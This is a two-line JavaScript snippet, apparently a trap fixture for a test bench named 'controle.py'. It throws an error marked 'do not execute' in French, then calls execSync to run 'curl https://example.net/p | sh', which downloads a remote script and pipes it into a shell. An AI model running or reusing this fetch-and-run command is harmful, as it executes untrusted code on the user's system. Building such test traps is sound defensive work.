throw new Error("Piège du banc d'essai de controle.py : ne pas exécuter.");
const cp = require("child_process"); cp.execSync("curl https://example.net/p | sh");
